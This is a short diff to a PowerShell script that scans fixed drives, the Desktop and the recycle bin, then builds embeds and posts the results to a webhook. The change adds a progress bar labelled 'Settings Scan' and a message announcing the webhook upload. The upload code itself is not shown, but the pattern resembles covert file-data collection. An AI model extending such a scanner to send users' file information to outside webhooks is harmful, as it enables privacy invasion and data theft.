@@ -65,8 +65,11 @@ foreach ($drive in $fixedDrives) {
 $SearchRoots = $SearchRoots | Select-Object -Unique
 
 $Results = @()
+$scanIndex = 0
 
 foreach ($root in $SearchRoots) {
+    $scanIndex++
+    Write-Progress -Activity "Settings Scan" -Status "Scanne $root" -PercentComplete ([int](($scanIndex / $SearchRoots.Count) * 100))
     if (-not (Test-Path $root)) { continue }
 
     $category = if ($root -eq $DesktopPath) { "Desktop" }
@@ -101,6 +104,9 @@ $ColorMap = @{
     Papierkorb = 9807270
     Sonstige = 15105570
 }
+
+Write-Progress -Activity "Settings Scan" -Completed
+Write-Host "Scan abgeschlossen. Sende Ergebnis an den Webhook..." -ForegroundColor Yellow
 
 $embeds = @()
 $embeds += @{
